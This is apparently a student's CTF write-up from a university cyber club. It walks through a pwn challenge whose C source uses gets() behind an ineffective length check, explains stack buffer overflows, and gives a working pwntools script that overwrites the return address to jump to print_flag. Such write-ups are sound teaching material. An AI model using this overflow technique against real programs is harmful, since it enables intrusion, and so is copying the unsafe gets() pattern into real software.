# pwn_gang fall 2024

After every Wednesday cyber meeting this quarter, a group of us would go to Olympic Hall to work on pwn challenges after dinner. As someone who isn't super familiar with pwn (web is definitely my main category), I thought it would be a great opportunity to learn something new and spend more time with the people in my club! Here one of the fundamental challenges I worked through in pwn gang.

## cat

This challenge provided the following source code

```
#include <stdio.h>
#include <string.h>

void print_flag(void) {
  FILE *flag_file = fopen("flag.txt", "r");
  char flag[256];
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
  fclose(flag_file);
}

int main(void) {
  setbuf(stdout, NULL);
  char buf[256];
  while (1) {
    gets(buf);
    if (strlen(buf) >= 256) {
      puts("no buffer overflows allowed");
      break;
    }
    puts(buf);
  }
}
```

Seeing the gets function automatically made me think this was a buffer overflow challenge. At first glance, I thought a buffer overflow wouldn't be possible because it checks the length of our input. However, this input checking isn't actually effective in preventing a buffer overflow. 

The way a buffer overflow works is the following. There is a buffer of a certain size allocated on the stack for the user's input, but there aren't any effective checks to make sure the input actually fits in that buffer. If the input is longer, it can overflow the buffer and overwrite other things on the stack. The return address is located on the stack, so we can craft a payload that overflows the buffer and overwrites the return address, so we can force the program to jump to the print_flag function.

The following was my pwntools script to perform this buffer overflow

```
#!/usr/bin/env python3
from pwn import *

# specify the process we are attacking
exe = ELF("./cat")

r = process([exe.path])

r = remote("box.acmcyber.com", 31338)

# get the address of the print_flag function
print_flag = exe.symbols["print_flag"]
print(print_flag)

# overflow the buffer and overwrite the return address with the address of the print_flag function


# what does p64 do? Send as raw bytes? Endianness?

# why is this 264 instead of 256? 256+8 = 264, so I'm thinking we wrote over another address or something
    # overwriting another return address pushed on the stack 

payload = b"A" * 264 + p64(print_flag)

r.sendline(payload)

r.interactive()
```

Running this python script returns the flag cyber{meow}
